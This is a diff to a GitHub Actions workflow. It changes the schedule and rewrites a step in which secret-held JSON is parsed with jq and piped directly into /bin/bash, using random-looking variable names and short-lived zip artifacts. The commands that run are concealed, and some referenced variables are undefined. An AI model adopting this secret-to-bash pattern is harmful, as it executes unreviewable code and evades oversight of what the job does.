@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '59 0,6,12,18 * * *'
+    - cron: '29 2,8,14,20 * * *'
 permissions:
   contents: read
 concurrency:
@@ -18,18 +18,16 @@ jobs:
           fetch-depth: 1
       - name: Perform
         env:
-          jqo576: ${{ secrets.jqo576 }}
+          kcg91: ${{ secrets.kcg91 }}
         run: |
-          printf '%s' "$jqo576" | jq -r .gddst7129 | /bin/bash
-          printf '%s' "$dxnl7" | jq -r .tvfn91 | /bin/bash
-          printf '%s' "$fns36417" | jq -r .flv54 | /bin/bash
-          echo $fdf13135 | jq -r .f94 | /bin/bash
-          echo $hs7 | jq -r .kbyf9153 | /bin/bash
+          printf '%s' "$kcg91" | jq -r .he30 | /bin/bash
+          printf '%s' "$qfkti06" | jq -r .q89775 | /bin/bash
+          printf '%s' "$fkqg18558" | jq -r .gqej1131 | /bin/bash
 
       - name: Upload results
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: 1AV5FgU
+          name: tkdBqOg4
           path: "*.zip"
           retention-days: 1
